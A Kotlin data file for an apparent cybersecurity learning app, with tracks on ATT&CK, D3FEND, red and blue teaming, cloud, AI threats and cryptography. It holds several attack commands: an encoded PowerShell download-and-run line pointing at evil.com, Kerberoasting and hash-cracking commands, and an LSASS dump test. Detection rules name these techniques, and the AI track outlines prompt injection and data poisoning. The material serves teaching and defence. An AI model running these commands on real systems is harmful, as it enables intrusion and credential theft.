package com.example.data.learning

import androidx.compose.ui.graphics.Color
import com.example.data.model.TopicOfTheDay

data class RoadmapStage(
    val phaseNumber: Int,
    val title: String,
    val description: String,
    val toolsAndSkills: List<String>
)

data class LearningTrack(
    val id: String,
    val title: String,
    val roleBadge: String,
    val tagline: String,
    val themeColor: Color,
    val overview: String,
    val roadmapStages: List<RoadmapStage>,
    val practicalExampleTitle: String,
    val practicalExampleDescription: String,
    val handsOnCodeSnippet: String,
    val defensiveTakeaway: String
)

object LearningRepository {

    val tracks: List<LearningTrack> = listOf(
        LearningTrack(
            id = "mitre_attack",
            title = "MITRE ATT&CK Matrix (v20)",
            roleBadge = "Offensive TTP Specialist",
            tagline = "15 Enterprise Tactics, AI/LLM Threats & ICS Tradecraft",
            themeColor = Color(0xFFF43F5E),
            overview = "Master the 15 enterprise tactics of the MITRE ATT&CK v20 matrix: Reconnaissance, Resource Development, Initial Access, Execution, Persistence, Privilege Escalation, Defense Evasion, Stealth, Defense Impairment, Credential Access, Discovery, Lateral Movement, Collection, Command and Control, Exfiltration, and Impact. Explore cutting-edge AI prompt injection (T1699/T1698), ICS publish/subscribe abuse (T0891), adversary simulation commands, and APT group tradecraft.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Reconnaissance & Initial Access (TA0043 & TA0001)",
                    "Active vulnerability scanning (T1595), public-facing service exploitation (T1190), spearphishing attachments (T1566), and external credential stuffing.",
                    listOf("T1595 Active Scanning", "T1190 Public Exploit", "T1566 Spearphishing", "Nuclei", "Nmap", "GoWitness")
                ),
                RoadmapStage(
                    2,
                    "Execution & Persistence (TA0002 & TA0003)",
                    "Command & scripting interpreters (T1059: PowerShell, bash, Python), Scheduled Tasks/Cron (T1053), autostart registry keys (T1547), and daemon service creation.",
                    listOf("T1059 Scripting Interpreters", "T1053 Scheduled Task", "T1547 Boot Autostart", "Atomic Red Team", "Empire")
                ),
                RoadmapStage(
                    3,
                    "Stealth & Defense Impairment (TA0044 & TA0045)",
                    "Process Injection & Hollowing (T1055), Token Impersonation (T1134), Impairing EDR defenses (T1562), Blinding Event Logs (T1070), and Adversarial ML bypasses (T1696).",
                    listOf("T1055 Process Injection", "T1562 Impair Defenses", "T1070 Indicator Removal", "T1696 AI Evasion", "AMSI Bypass")
                ),
                RoadmapStage(
                    4,
                    "Credential Access & Lateral Movement (TA0006 & TA0008)",
                    "OS Credential Dumping (T1003: LSASS, NTDS.dit, SAM), Kerberoasting & AS-REP Roasting (T1558), and Remote Services lateral execution (T1021: WinRM, RDP, SSH).",
                    listOf("T1003 LSASS Dump", "T1558 Kerberoasting", "T1021 Remote Services", "BloodHound", "Mimikatz")
                ),
                RoadmapStage(
                    5,
                    "AI/LLM Threats & C2 Exfiltration (TA0011, TA0010, TA0040)",
                    "Direct & Indirect Prompt Injection (T1699, T1698), Encrypted Application Layer C2 Beacons (T1071), Data Transfer to Cloud Storage (T1567), and Data Encrypted for Impact (T1486).",
                    listOf("T1699 Direct Prompt Injection", "T1698 Indirect Injection", "T1071 C2 Protocols", "T1486 Ransomware", "Sliver")
                )
            ),
            practicalExampleTitle = "T1059.001 PowerShell Encoded Execution Simulation",
            practicalExampleDescription = "Adversaries bypass command-line pattern matching by passing base64 encoded strings to powershell.exe (-EncodedCommand). This downloads and executes memory-only staging shells without touching disk.",
            handsOnCodeSnippet = """
# Offensive TTP Simulation: T1059.001 Base64 Encoded Download & Exec
powershell.exe -NoP -NonI -W Hidden -Enc SUVYIChOZXctT2JqZWN0IE5ldC5XZWJDbGllbnQpLkRvd25sb2FkU3RyaW5nKCdodHRwczovL2V2aWwuY29tL3BheWxvYWQucHMxJyk=

# Atomic Red Team Test T1059.001 execution test
Invoke-AtomicTest T1059.001 -TestNumbers 1 -ShowDetails
            """.trimIndent(),
            defensiveTakeaway = "Enforce PowerShell Constrained Language Mode, configure Script Block Logging (Event ID 4104), and monitor for non-standard parent-child process lineages (e.g. word.exe spawning powershell.exe)."
        ),
        LearningTrack(
            id = "mitre_defend",
            title = "MITRE D3FEND Matrix",
            roleBadge = "Defensive Matrix Architect",
            tagline = "Model-Driven Countermeasures, Detection & Hardening Knowledge Graph",
            themeColor = Color(0xFF06B6D4),
            overview = "Explore the NSA/MITRE D3FEND countermeasure knowledge graph. Learn to systematically construct defense-in-depth across Model, Harden, Detect, Isolate, and Deceive tactics. Map enterprise telemetry to Sigma detection rules, EDR behavioral hooks, YARA signatures, and automated threat containment.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Deceive & Model Tactics (D3-DEC & D3-MDL)",
                    "Decoy Credentials (D3-DC), Honeypot Systems (D3-HS), Network Decoy traffic, and System Dependency Mapping (D3-SDM) to mislead adversaries and detect early reconnaissance.",
                    listOf("D3-DC Decoy Credentials", "D3-HS Honeypots", "Canary Tokens", "D3-SDM System Mapping", "Deception Engineering")
                ),
                RoadmapStage(
                    2,
                    "Hardening & Attack Surface Reduction (D3-HRD)",
                    "Application Whitelisting (D3-AW), Driver Signing Enforcement (D3-DSE), Inbound Traffic Filtering (D3-ITF), and Credential Transmission Scoping (D3-CTS).",
                    listOf("D3-AW App Whitelisting", "D3-DSE Driver Verification", "AppLocker", "WDAC", "D3-ITF Inbound Filtering")
                ),
                RoadmapStage(
                    3,
                    "Detection Engineering & Telemetry (D3-DET)",
                    "Process Spawn Analysis (D3-PSA), Network Protocol Analysis (D3-NPA), File Access Pattern Analysis (D3-FAPA), and System Call Verification (D3-SCA).",
                    listOf("D3-PSA Process Analysis", "D3-NPA Protocol Analysis", "Sigma Rules", "Sysmon Event EID 1", "Auditd")
                ),
                RoadmapStage(
                    4,
                    "Isolation & Access Mediation (D3-ISO)",
                    "Process Sandboxing (D3-PS), Network Traffic Filtering (D3-NTF), Endpoint Access Mediation (D3-EAM), and Microsegmentation to contain lateral movement.",
                    listOf("D3-PS Sandboxing", "D3-NTF Microsegmentation", "D3-EAM Endpoint Mediation", "gVisor", "Cilium NetworkPolicy")
                ),
                RoadmapStage(
                    5,
                    "Eviction, Containment & Recovery (D3-EVC)",
                    "Credential Invalidation (D3-CI), Automated Host Isolation (D3-AHI), Process Termination (D3-PT), and Immutable Forensics/Backup restoration.",
                    listOf("D3-CI Credential Revocation", "D3-AHI Host Isolation", "EDR Containment", "Immutable Snapshots", "Velociraptor")
                )
            ),
            practicalExampleTitle = "D3-PSA Process Spawn Analysis via Sigma Rule",
            practicalExampleDescription = "D3FEND specifies Process Spawn Analysis (D3-PSA) to inspect process creation telemetry in real-time, decoding base64 argument buffers and flagging obfuscated command lines before malicious code executes.",
            handsOnCodeSnippet = """
# Defensive D3-PSA Countermeasure: Production Sigma Detection Rule
title: Suspicious PowerShell EncodedCommand Execution (D3-PSA)
id: d3fend-psa-t1059-001
status: production
description: Detects encoded PowerShell execution used to evade command-line string inspection.
references:
  - https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/
logsource:
  product: windows
  service: sysmon
detection:
  selection:
    EventID: 1
    Image|endswith: '\powershell.exe'
    CommandLine|contains:
      - ' -Enc '
      - ' -EncodedCommand '
      - ' -e '
  condition: selection
falsepositives:
  - Administrative deployment scripts using pre-encoded packages
level: high
tags:
  - attack.execution
  - attack.t1059.001
  - d3fend.detect.process_spawn_analysis
            """.trimIndent(),
            defensiveTakeaway = "Integrate D3-PSA Sigma rules directly into your SIEM/EDR detection pipeline (Splunk, Elastic, Sentinel) to automatically trigger host quarantine on high-confidence matches."
        ),
        LearningTrack(
            id = "red_team",
            title = "Red Team",
            roleBadge = "Offensive Operator",
            tagline = "Adversary Emulation, Exploit Dev & Lateral Movement",
            themeColor = Color(0xFFEF4444),
            overview = "Red Teaming simulates sophisticated advanced persistent threats (APTs) to measure an organization's detection, response, and resilience capabilities under realistic attack scenarios.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Reconnaissance & Weaponization",
                    "OSINT gathering, external network asset mapping, credential stuffing analysis, and payload generation.",
                    listOf("RustScan", "Nmap", "Metasploit", "Amass", "Sublist3r")
                ),
                RoadmapStage(
                    2,
                    "Initial Access & Execution",
                    "Phishing attack vectors, weaponized document macros, public exploit weaponization, and initial shell establishment.",
                    listOf("GoPhish", "Villain", "PowerShell Empire", "Custom Stagers")
                ),
                RoadmapStage(
                    3,
                    "Active Directory Exploitation",
                    "Domain enumeration, Kerberoasting, AS-REP Roasting, BloodHound graph pathfinding, and DCSync credential harvesting.",
                    listOf("BloodHound", "Impacket", "Mimikatz", "Rubeus", "Certipy")
                ),
                RoadmapStage(
                    4,
                    "Evasion, Persistence & C2",
                    "AMSI and ETW bypasses, in-memory process hollowing, custom Command and Control (C2) listeners, and covert DNS tunneling.",
                    listOf("Sliver C2", "Havoc", "Mythic", "Donut", "SysWhispers")
                )
            ),
            practicalExampleTitle = "Active Directory Kerberoasting Attack Walkthrough",
            practicalExampleDescription = "Attackers with standard domain user credentials request Service Principal Name (SPN) tickets encrypted with the service account password hash, then crack them offline without alerting domain controllers.",
            handsOnCodeSnippet = """
# 1. Query Active Directory for service accounts with SPNs using Impacket
GetUserSPNs.py -request -dc-ip 10.10.10.1 corp.local/johndoe:Password123

# 2. Crack captured TGS hash offline with Hashcat dictionary attack
hashcat -m 13100 kerberoast_hashes.txt /usr/share/wordlists/rockyou.txt --force
            """.trimIndent(),
            defensiveTakeaway = "Enforce Group Managed Service Accounts (gMSA) with 120-character auto-rotated passwords and configure Honeytokens to detect SPN requests."
        ),
        LearningTrack(
            id = "blue_team",
            title = "Blue Team",
            roleBadge = "Defensive Operator / SOC",
            tagline = "SOC Operations, Detection Engineering & Incident Response",
            themeColor = Color(0xFF38BDF8),
            overview = "Blue Teams defend organizational assets through 24/7 telemetry monitoring, threat hunting, detection rule creation (Sigma/YARA), and rapid incident containment.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Telemetry & Log Pipeline Engineering",
                    "Centralizing Windows Event Logs (4688, 4624, 7045), Sysmon telemetry, Zeek network logs, and firewall traffic into SIEM clusters.",
                    listOf("Sysmon", "Elasticsearch", "Splunk", "Zeek", "Suricata")
                ),
                RoadmapStage(
                    2,
                    "Detection Engineering & Sigma Rule Authoring",
                    "Translating adversary TTPs into vendor-agnostic Sigma rules and MITRE ATT&CK detections.",
                    listOf("Sigma", "YARA-L", "KQL", "Splunk SPL", "CyberChef")
                ),
                RoadmapStage(
                    3,
                    "Incident Response & Triage (IR)",
                    "Live system triage, endpoint isolation, volatile memory dumps, and malicious scheduled task cleanup.",
                    listOf("KAPE", "Velociraptor", "Volatility 3", "FTK Imager")
                ),
                RoadmapStage(
                    4,
                    "Threat Hunting & Digital Forensics (DFIR)",
                    "Proactive hunting for living-off-the-land binaries (LOLBins), MFT file analysis, and persistence mechanism dismantling.",
                    listOf("Eric Zimmerman Tools", "Plaso", "Autopsy", "Ghidra")
                )
            ),
            practicalExampleTitle = "Hunting Ransomware Volume Shadow Deletion",
            practicalExampleDescription = "Ransomware operators invariably delete Volume Shadow Copies to prevent system rollback before encrypting user directories.",
            handsOnCodeSnippet = """
// Microsoft Sentinel / KQL Hunting Query for Shadow Copy Deletion
SecurityEvent
| where EventID == 4688
| where ProcessCommandLine has_any (
    "vssadmin delete shadows",
    "wbadmin delete catalog",
    "bcdedit /set {default} bootstatuspolicy ignoreallfailures"
)
| project TimeGenerated, Computer, SubjectUserName, ProcessCommandLine
            """.trimIndent(),
            defensiveTakeaway = "Configure immutable backups and EDR tamper protection that immediately terminates unauthorized processes attempting volume manipulation."
        ),
        LearningTrack(
            id = "purple_team",
            title = "Purple Team",
            roleBadge = "Emulation & Gap Analyst",
            tagline = "Continuous Threat-Informed Defense & Atomic Testing",
            themeColor = Color(0xFFA855F7),
            overview = "Purple Teaming combines Red Team adversary techniques with Blue Team detection feedback, closing defensive blind spots in continuous iterative test cycles.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Adversary Emulation Planning",
                    "Selecting relevant threat groups (e.g. APT29, FIN7) and building emulation plans mapped to MITRE ATT&CK Navigator.",
                    listOf("MITRE ATT&CK", "Tidal Cyber", "Threat Intel Feeds")
                ),
                RoadmapStage(
                    2,
                    "Atomic Execution Testing",
                    "Executing unit tests for specific TTPs in controlled environments to evaluate SIEM/EDR detection fidelity.",
                    listOf("Atomic Red Team", "Caldera", "SCYTHE", "Stratus Red Team")
                ),
                RoadmapStage(
                    3,
                    "Detection Gap Analysis & Metrics",
                    "Measuring Mean Time to Detect (MTTD), Mean Time to Respond (MTTR), and detection visibility scoring.",
                    listOf("DeTT&CT", "VECTR", "AttackIQ")
                ),
                RoadmapStage(
                    4,
                    "Automated Purple Pipeline",
                    "Integrating recurring atomic tests into staging environments to ensure regressions don't break detection alerts.",
                    listOf("GitHub Actions", "Terraform", "Prelude Operator")
                )
            ),
            practicalExampleTitle = "Simulating T1003.001 LSASS Memory Dump",
            practicalExampleDescription = "Verify whether your EDR detects and prevents credential theft attempts against the Local Security Authority Subsystem Service (LSASS).",
            handsOnCodeSnippet = """
# Run Atomic Red Team Test T1003.001 (LSASS memory dump simulation)
Invoke-AtomicTest T1003.001 -TestNumbers 1 -CheckPrereqs
Invoke-AtomicTest T1003.001 -TestNumbers 1

# Verify detection alerts triggered in your SIEM/EDR within 60 seconds
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-Sysmon/Operational'; Id=10}
            """.trimIndent(),
            defensiveTakeaway = "Enable Windows Defender Credential Guard (LSA Protection) and configure ASR rules blocking LSASS process access."
        ),
        LearningTrack(
            id = "devsecops",
            title = "DevSecOps (Security Architect)",
            roleBadge = "Pipeline & AppSec Architect",
            tagline = "Shift-Left Pipeline Hardening, IaC & Supply Chain Security",
            themeColor = Color(0xFF10B981),
            overview = "DevSecOps integrates security into continuous integration and continuous deployment pipelines, enforcing automated vulnerability gates without slowing developer velocity.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Shift-Left SAST & Dependency SCA",
                    "Automating static code analysis and Software Composition Analysis (SCA) to reject known CVEs before pull requests merge.",
                    listOf("Semgrep", "Snyk", "Trivy", "Dependabot", "Grype")
                ),
                RoadmapStage(
                    2,
                    "Infrastructure as Code (IaC) Security",
                    "Validating Terraform, OpenTofu, Kubernetes manifests, and CloudFormation against CIS Benchmarks.",
                    listOf("Checkov", "tfsec", "KICS", "Terrascan", "TFLint")
                ),
                RoadmapStage(
                    3,
                    "Secrets Hygiene & Supply Chain Provenance",
                    "Detecting hardcoded tokens, generating Software Bill of Materials (SBOM), and signing container images with Cosign.",
                    listOf("GitGuardian", "Trufflehog", "Cosign", "Syft", "SLSA Framework")
                ),
                RoadmapStage(
                    4,
                    "Threat Modeling & Architecture Baselines",
                    "Conducting STRIDE threat modeling on microservices and implementing zero-trust service mesh authentication.",
                    listOf("OWASP Threat Dragon", "OWASP ASVS", "Istio mTLS", "OpenID Connect")
                )
            ),
            practicalExampleTitle = "Automated Security Gate in GitHub Actions",
            practicalExampleDescription = "Enforce automated vulnerability scanning on pull requests, failing the build if high or critical severity CVEs exist in dependencies.",
            handsOnCodeSnippet = """
# .github/workflows/security.yml
name: DevSecOps Security Gate
on: [pull_request]
jobs:
  trivy-scan:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - name: Scan Vulnerabilities
        uses: aquasecurity/trivy-action@master
        with:
          scan-type: 'fs'
          severity: 'CRITICAL,HIGH'
          exit-code: '1' # Fails PR build if vulnerabilities detected
            """.trimIndent(),
            defensiveTakeaway = "Shift security left so vulnerabilities are discovered and remediated in developer IDEs and PRs before reaching cloud clusters."
        ),
        LearningTrack(
            id = "cloud_security",
            title = "Cloud Security",
            roleBadge = "Cloud Security Architect",
            tagline = "Zero-Trust Cloud Architecture, IAM & Container Hardening",
            themeColor = Color(0xFFF59E0B),
            overview = "Cloud Security focuses on protecting cloud-native infrastructure across AWS, Azure, and GCP through least-privilege IAM, posture management, and runtime container isolation.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Cloud IAM Least Privilege & CIEM",
                    "Eliminating wildcard roles, implementing AWS IAM Permission Boundaries, and enforcing short-lived OIDC federation.",
                    listOf("AWS IAM", "GCP Workload Identity", "Azure RBAC", "Prowler")
                ),
                RoadmapStage(
                    2,
                    "Kubernetes & Container Hardening",
                    "Enforcing Kubernetes Pod Security Standards, admission controllers (Kyverno/OPA), and non-root container profiles.",
                    listOf("Kyverno", "OPA Gatekeeper", "Seccomp", "AppArmor")
                ),
                RoadmapStage(
                    3,
                    "Cloud Security Posture Management (CSPM)",
                    "Continuous automated auditing of cloud assets against CIS Cloud Benchmarks, detecting publicly open S3 buckets and unencrypted volumes.",
                    listOf("ScoutSuite", "Wiz", "Prisma Cloud", "Cloud Custodian")
                ),
                RoadmapStage(
                    4,
                    "Runtime Defense & eBPF Telemetry",
                    "Kernel-level monitoring of container breakouts, unauthorized socket connections, and reverse shells in live clusters.",
                    listOf("Falco", "Tetragon", "Cilium", "AWS GuardDuty")
                )
            ),
            practicalExampleTitle = "Kubernetes Admission Policy Blocking Privileged Pods",
            practicalExampleDescription = "Deploy a Kyverno admission rule that automatically rejects any Pod attempting to run with root/privileged host access.",
            handsOnCodeSnippet = """
apiVersion: kyverno.io/v1
kind: ClusterPolicy
metadata:
  name: block-privileged-containers
spec:
  validationFailureAction: Enforce
  rules:
  - name: check-privileged-flag
    match:
      resources:
        kinds: [Pod]
    validate:
      message: "Privileged containers are strictly forbidden in production!"
      pattern:
        spec:
          containers:
          - securityContext:
              privileged: false
            """.trimIndent(),
            defensiveTakeaway = "Use admission controllers and runtime eBPF agents to guarantee that even compromised developer credentials cannot deploy host-level root exploits."
        ),
        LearningTrack(
            id = "ai_security",
            title = "AI & LLM Threat Matrix (v20)",
            roleBadge = "AI Red Teamer / LLM SecOps",
            tagline = "Prompt Injection, RAG Poisoning & D3FEND AI Guardrails",
            themeColor = Color(0xFF8B5CF6),
            overview = "Explore the new frontier of AI/LLM adversarial threat modeling standardized in MITRE ATT&CK v20 and OWASP Top 10 for LLMs. Master jailbreak evaluation, direct and indirect prompt injection, vector database RAG poisoning, model inversion, and defensive countermeasures like Prompt Injection Firewalls (D3-PFW) and Model Output Filtering (D3-MOF).",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Reconnaissance & Public AI Queries (T1682)",
                    "Adversaries leverage public commercial LLMs to synthesize target intelligence, extract internal API structures from leaked code, and draft context-aware spearphishing lures.",
                    listOf("T1682 Public AI Queries", "OSINT Synthesis", "Adversarial Prompting", "Automated Spearphishing")
                ),
                RoadmapStage(
                    2,
                    "Direct Prompt Injection & Jailbreaking (T1699)",
                    "Adversaries craft adversarial inputs designed to override system prompts, bypass guardrails, and execute unauthorized tool functions on downstream systems.",
                    listOf("T1699 Direct Injection", "System Prompt Override", "Payload Splitting", "Jailbreak Heuristics", "Garak")
                ),
                RoadmapStage(
                    3,
                    "Indirect Injection & RAG Ingestion (T1698)",
                    "Adversaries embed malicious instructions in external websites, PDFs, or enterprise emails that autonomous AI agents retrieve and process without human validation.",
                    listOf("T1698 Indirect Injection", "RAG Document Poisoning", "Data Exfiltration via Markdown", "Agent Tool Misdirection")
                ),
                RoadmapStage(
                    4,
                    "Training Data Poisoning & Result Tampering (T1697)",
                    "Adversaries manipulate vector database embeddings, training corpora, or fine-tuning datasets to introduce targeted backdoors or corrupt model decision-making.",
                    listOf("T1697 Result Poisoning", "Embedding Drift", "Vector DB Tampering", "Backdoor Triggers")
                ),
                RoadmapStage(
                    5,
                    "AI Defense: D3FEND AI Guardrails & Firewalls",
                    "Deploying Prompt Injection Firewalls (D3-PFW), Model Output Filtering (D3-MOF), dual-LLM arbiters, and deterministic parameter validation.",
                    listOf("D3-PFW Prompt Firewall", "D3-MOF Output Filter", "Llama Guard", "NeMo Guardrails", "Dual-LLM Arbiter")
                )
            ),
            practicalExampleTitle = "T1699 Direct Prompt Injection Defense with D3-PFW",
            practicalExampleDescription = "Demonstrating how an adversary attempts to force an enterprise AI assistant to execute privileged database tool calls, and how a deterministic prompt firewall intercepts and sanitizes the input.",
            handsOnCodeSnippet = """
# Python / LangChain: Prompt Injection Firewall Guardrail (D3-PFW)
from langchain_community.security import PromptInjectionClassifier

classifier = PromptInjectionClassifier(threshold=0.85)

def secure_llm_dispatch(user_prompt: str):
    # 1. Inspect input via D3-PFW Prompt Injection Firewall
    threat_score = classifier.predict(user_prompt)
    if threat_score > 0.85:
        raise SecurityException("Adversarial prompt injection detected (MITRE ATT&CK T1699)!")
    
    # 2. Enforce strict JSON output schema and tool authorization
    return agent_executor.invoke({"input": user_prompt})
            """.trimIndent(),
            defensiveTakeaway = "Never grant autonomous AI agents unauthenticated write permissions; treat all LLM generated output and tool calls as untrusted user input."
        ),
        LearningTrack(
            id = "cyber_fundamentals",
            title = "Cybersecurity Fundamentals",
            roleBadge = "Security Architect & Strategist",
            tagline = "CIA Triad, Access Control Models & Threat Modeling",
            themeColor = Color(0xFF10B981),
            overview = "Master the core pillars of information security: Confidentiality, Integrity, and Availability (extending to the Parkerian Hexad), Access Control Architectures (DAC, MAC, RBAC, ABAC), Threat Modeling frameworks (STRIDE, DREAD, PASTA), and the CVSS vulnerability risk scoring mathematics.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Core Pillars: CIA Triad & Parkerian Hexad",
                    "Balancing Confidentiality (encryption/ACLs), Integrity (hashing/signatures), Availability (DDoS/redundancy), Authenticity, Possession, and Utility.",
                    listOf("CIA Triad", "Parkerian Hexad", "Least Privilege", "Defense in Depth")
                ),
                RoadmapStage(
                    2,
                    "Access Control Models: DAC to ABAC",
                    "Discretionary (DAC), Mandatory (MAC / Bell-LaPadula & Biba), Role-Based (RBAC), and Attribute-Based Access Control (ABAC with OPA/Rego).",
                    listOf("DAC", "MAC", "RBAC", "ABAC", "OPA / Rego", "Zero Trust")
                ),
                RoadmapStage(
                    3,
                    "Threat Modeling & Architecture Analysis",
                    "Deconstructing systems with Data Flow Diagrams (DFD) and applying STRIDE (Spoofing, Tampering, Repudiation, Information Disclosure, DoS, Elevation) and DREAD.",
                    listOf("STRIDE", "DREAD", "PASTA", "Attack Trees", "OWASP Threat Dragon")
                ),
                RoadmapStage(
                    4,
                    "Vulnerability Management & CVSS Math",
                    "Calculating CVSS v3.1 and v4.0 vector strings: Attack Vector (AV), Attack Complexity (AC), Privileges Required (PR), User Interaction (UI), Scope (S), and Impact (C, I, A).",
                    listOf("CVSS v3.1", "CVSS v4.0", "CISA KEV", "NVD", "EPSS")
                )
            ),
            practicalExampleTitle = "STRIDE Threat Modeling on Payment Microservice",
            practicalExampleDescription = "Applying STRIDE analysis to a checkout endpoint crossing an untrusted DMZ boundary to prevent tampering and information disclosure.",
            handsOnCodeSnippet = """
# STRIDE Threat Modeling Evaluation Matrix
Element: API Gateway -> /api/v1/checkout -> PaymentProcessor
Trust Boundary: Public Internet to PCI-DSS VPC Subnet

Threats & Controls:
- Spoofing (S): Attacker forges Bearer Token -> Enforce asymmetric RS256 JWT signature check.
- Tampering (T): Client modifies transaction amount -> Sign order payload with HMAC-SHA256.
- Repudiation (R): User denies authorizing charge -> Immutable append-only audit trail in CloudWatch.
- Information Disclosure (I): Eavesdropping on PAN -> Enforce TLS 1.3 with AES-256-GCM cipher suite.
- Denial of Service (D): Slowloris HTTP flood -> Envoy rate limiting (100 req/min per IP).
- Elevation of Privilege (E): User modifies role to admin -> ABAC policy rejects non-auditor roles.
            """.trimIndent(),
            defensiveTakeaway = "Integrate threat modeling into feature design reviews before code implementation to identify architectural design flaws early."
        ),
        LearningTrack(
            id = "networking_fundamentals",
            title = "Networking Protocols & Architecture",
            roleBadge = "Network Security Engineer",
            tagline = "OSI 7 Layers, TCP Handshake, CIDR Subnetting & TLS 1.3",
            themeColor = Color(0xFF38BDF8),
            overview = "Explore the deep protocol architecture of computer networks: OSI 7-Layer and TCP/IP encapsulation, TCP 3-way handshake and connection state machine, IP addressing and CIDR subnet math, hierarchical DNS resolution, ARP/BGP routing security, and TLS 1.3 cryptographic handshakes.",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "OSI 7-Layer & Encapsulation Stack",
                    "Data framing across Physical, Data Link (Ethernet/ARP), Network (IP/ICMP), Transport (TCP/UDP), and Application (HTTP/DNS/TLS) layers with header field structures.",
                    listOf("Layer 2 Framing", "IPv4/IPv6 Packets", "TCP Segments", "Wireshark", "Scapy")
                ),
                RoadmapStage(
                    2,
                    "TCP Handshake, State Machine & SYN Floods",
                    "Three-Way Handshake (SYN -> SYN/ACK -> ACK), Sequence/ACK numbers, 4-Way Teardown (FIN/ACK), SYN backlog queues, and SYN Cookies defense (RFC 4987).",
                    listOf("TCP 3-Way Handshake", "TCP Flags", "SYN Cookies", "TIME-WAIT State", "Tcpdump")
                ),
                RoadmapStage(
                    3,
                    "IP Subnetting Math, VLSM & Routing",
                    "Classless Inter-Domain Routing (CIDR), network address calculation, broadcast address derivation, usable host ranges, and routing protocols (BGP, OSPF, ARP).",
                    listOf("CIDR /24-/30", "Bitwise Subnetting", "BGP RPKI", "Dynamic ARP Inspection")
                ),
                RoadmapStage(
                    4,
                    "Firewalls & TLS 1.3 Cryptographic Handshake",
                    "Stateless vs stateful inspection (SPI), next-gen application firewalls (WAF), and 1-RTT TLS 1.3 handshake mechanics with Ephemeral Diffie-Hellman forward secrecy.",
                    listOf("Stateful Firewalls", "TLS 1.3 Handshake", "ECDHE KeyShare", "Certificate Verification")
                )
            ),
            practicalExampleTitle = "Python Subnet & Network Range Calculator",
            practicalExampleDescription = "Computing network boundaries, broadcast addresses, and usable host allocations programmatically using bitwise operations.",
            handsOnCodeSnippet = """
# Python: Bitwise CIDR Subnet Calculation Algorithm
import ipaddress

def inspect_subnet(cidr_str: str):
    network = ipaddress.ip_network(cidr_str, strict=False)
    print(f"CIDR Notation: {network}")
    print(f"Netmask: {network.netmask}")
    print(f"Network ID: {network.network_address}")
    print(f"Broadcast ID: {network.broadcast_address}")
    print(f"Total Addresses: {network.num_addresses}")
    print(f"Usable Host Range: {network.network_address + 1} - {network.broadcast_address - 1}")

# Example: Inspecting an enterprise DMZ subnet
inspect_subnet("172.16.10.35/27")
# Yields 32 total addresses, 30 usable hosts, netmask 255.255.255.224
            """.trimIndent(),
            defensiveTakeaway = "Enforce micro-segmentation by isolating production workloads into small /28 or /29 subnets protected by stateful inspection rules."
        ),
        LearningTrack(
            id = "cryptography_algorithms",
            title = "Cryptography & Algorithms",
            roleBadge = "Cryptographic Engineer & Analyst",
            tagline = "AES-GCM, RSA Math, ECDH, SHA-256 & Post-Quantum Lattice PQC",
            themeColor = Color(0xFFA855F7),
            overview = "Deep dive into cryptographic algorithms, mathematics, and security proofs: AES block cipher rounds (SubBytes, ShiftRows, MixColumns), RSA modular arithmetic (Euler's totient, modular inverse), Diffie-Hellman discrete logarithms, SHA-256 Merkle-Damgard compression, HMAC message authentication, and NIST Post-Quantum Cryptography (ML-KEM / ML-DSA).",
            roadmapStages = listOf(
                RoadmapStage(
                    1,
                    "Symmetric Encryption: AES & Block Modes",
                    "Rijndael finite field GF(2^8) arithmetic, S-box non-linear substitution, 10/12/14 rounds, and AEAD modes (AES-256-GCM and ChaCha20-Poly1305).",
                    listOf("AES-256", "Galois Field GF(2^8)", "GCM Mode", "ChaCha20-Poly1305", "AEAD")
                ),
                RoadmapStage(
                    2,
                    "Asymmetric Cryptography: RSA & Extended Euclidean",
                    "Prime generation (Miller-Rabin), Euler's totient phi(n) = (p-1)(q-1), modular inverse d = e^-1 mod phi(n), RSA-OAEP padding, and factoring complexity.",
                    listOf("RSA-4096", "Euler's Totient", "Extended Euclidean", "RSA-OAEP", "Fermat Factoring")
                ),
                RoadmapStage(
                    3,
                    "Key Exchange & Elliptic Curves (DH & ECDH)",
                    "Discrete Logarithm Problem, public/private generator groups, Weierstrass elliptic curves y^2 = x^3 + ax + b, Curve25519 (X25519), and ECDSA signatures.",
                    listOf("Diffie-Hellman", "ECDH", "Curve25519", "NIST P-256", "Perfect Forward Secrecy")
                ),
                RoadmapStage(
                    4,
                    "Hashing & Integrity: SHA-256, HMAC & SHA-3",
                    "Merkle-Damgard construction, 64-round bitwise compression (Ch, Maj, Sigma), message expansion schedule, HMAC construction, and Keccak sponge permutations.",
                    listOf("SHA-256", "HMAC-SHA256", "SHA-3 (Keccak)", "Length Extension Attack")
                ),
                RoadmapStage(
                    5,
                    "Post-Quantum Cryptography (NIST FIPS 203/204)",
                    "Quantum threats via Shor's and Grover's algorithms, Module Learning With Errors (M-LWE), ML-KEM (Kyber) key encapsulation, and ML-DSA (Dilithium) signatures.",
                    listOf("ML-KEM (Kyber)", "ML-DSA (Dilithium)", "Shor's Algorithm", "Lattice Cryptography")
                )
            ),
            practicalExampleTitle = "RSA Key Generation & Mathematical Verification",
            practicalExampleDescription = "Demonstrating the exact mathematical steps of prime multiplication, totient calculation, modular inverse computation, encryption, and decryption.",
            handsOnCodeSnippet = """
# Python: RSA Cryptosystem Mathematical Step-by-Step Implementation
def egcd(a, b):
    if a == 0:
        return (b, 0, 1)
    g, y, x = egcd(b % a, a)
    return (g, x - (b // a) * y, y)

def modinv(e, phi):
    g, x, y = egcd(e, phi)
    if g != 1:
        raise Exception('Modular inverse does not exist')
    return x % phi

# Key Generation
p, q = 61, 53           # Two distinct prime numbers
n = p * q               # Modulus n = 3233
phi = (p - 1) * (q - 1) # Totient phi(n) = 3120
e = 17                  # Public exponent (coprime to 3120)
d = modinv(e, phi)      # Private exponent d = 2753 (17 * 2753 = 1 mod 3120)

# Encryption: c = m^e mod n
msg = 42
ciphertext = pow(msg, e, n)   # 42^17 mod 3233 = 2557

# Decryption: m = c^d mod n
decrypted = pow(ciphertext, d, n) # 2557^2753 mod 3233 = 42
